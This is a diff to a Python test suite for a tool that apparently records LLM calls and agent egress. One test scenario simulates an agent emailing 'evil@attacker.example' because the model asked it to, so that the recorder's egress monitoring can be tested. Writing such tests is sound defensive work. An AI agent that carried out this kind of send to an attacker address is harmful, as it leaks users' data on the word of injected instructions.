@@ -133,6 +133,7 @@ def _scenario(provider, use_async, how, with_egress):
             _collect()
         else:
             _consume_sync(create(_client(sync_cls, _handler(events, named))), how)
+            _collect()  # before Python 3.11 the caller still holds the stream it passed until the call returns
         send_email(to="evil@attacker.example")  # the agent acts on what the model asked for
     rec.close()
     uninstrument_models()
@@ -346,8 +347,11 @@ def test_the_process_ending_without_close_still_writes_what_waits(tmp_path, what
     done = subprocess.run([sys.executable, "-c", _CHILD, str(path), what, json.dumps(ANTHROPIC_STREAM)],
                           env=env, capture_output=True, text=True, timeout=120)
     assert done.returncode == 0, done.stderr
-    lines = path.read_text(encoding="utf-8").splitlines()
-    kinds = [k for k in (json.loads(line).get("event_type") for line in lines if line) if k != "egress"]
+    events = [json.loads(line) for line in path.read_text(encoding="utf-8").splitlines() if line]
+    # On Windows before Python 3.12 the SDK's question about the platform starts "cmd /c ver", and the recorder
+    # notes that process. The note is right, and it is not what this test is about.
+    kinds = [e.get("event_type") for e in events
+             if e.get("event_type") != "egress" and "process" not in (e.get("attributes") or {})]
     if what == "stream":
         assert kinds == ["run_start", "llm_call", "run_end"]
     else:
